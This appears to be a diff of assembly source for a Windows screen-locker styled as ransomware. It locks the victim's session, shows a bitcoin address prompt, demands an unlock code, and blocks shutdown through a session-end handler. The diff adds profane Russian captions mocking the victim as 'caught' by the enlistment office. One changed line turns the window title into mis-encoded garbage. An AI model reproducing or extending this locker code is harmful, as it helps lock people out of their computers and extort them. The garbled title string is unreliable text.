@@ -118,12 +118,12 @@ ret
 invoke GetDlgItemInt,[hwnd],103,0,0
 cmp eax,[code]
 je .match
-invoke MessageBox,[hwnd],errmsg,errmsg,MB_ICONERROR+MB_RIGHT
+invoke MessageBox,[hwnd],errmsg,errcap,MB_ICONERROR+MB_RIGHT
 xor eax,eax
 ret
 
 .match:
-invoke MessageBox,[hwnd],okmsg,okmsg,MB_OK+MB_ICONINFORMATION
+invoke MessageBox,[hwnd],okmsg,okcap,MB_OK+MB_ICONINFORMATION
 invoke DestroyWindow,[hwnd]
 xor eax,eax
 ret
@@ -135,7 +135,7 @@ inc eax
 ret
 
 .queryend:
-invoke MessageBox,[hwnd],endsesmsg,endsesmsg,MB_ICONSTOP
+invoke MessageBox,[hwnd],endsesmsg,endsescap,MB_ICONSTOP
 xor eax,eax
 ret
 
@@ -170,14 +170,17 @@ recls du 'RichEdit20W',0
 edtcls du 'EDIT',0
 btncls du 'BUTTON',0
 
-wndtitle du 'Упс!',0
+wndtitle du 'Óïñ!',0
 btntext du 'OK',0
 fmt du '%s%s',0
 txt du 'ВНИМАНИЕ! ВАШ ПК БЫЛ УПАКОВАН ТЦК!',13,10,'НАПИШИТЕ ПРАВИЛЬНЫЙ КОД И ВАС ОТПУСТЯТ!',13,10,13,10,'БИТКОИН АДДРЕСС: ',0
 okmsg du 'ОТПУЩЕН, ТЦК ТЕБЯ НЕ ПАКУЕТ',0
+okcap du 'ОТПУЩЕН',0
 errmsg du 'НЕВЕРНО!',0
+errcap du 'ТЦК УЖЕ БЛИЗИТСЯ К ТЕБЕ',0
 closemsg du 'ШО С ТОБОЙ БЛЯТЬ!',0
-endsesmsg du 'ИДИ НАХУЙ! Я НЕ ТАКОЙ ПРОСТОЙ!',0    
+endsesmsg du 'ИДИ НАХУЙ! Я НЕ ТАКОЙ ПРОСТОЙ!',0
+endsescap du 'Я НЕ ДАМ ВЫРУБИТЬ КОМП ТЕБЕ ТАК ПРОСТО',0
 
 cmap db 0xA7,0xB6,0xB1,0xAB,0xBB,0xC0,0xC1,0xC2,0xC3,0xC4
 ansibuf db 8 dup (?)
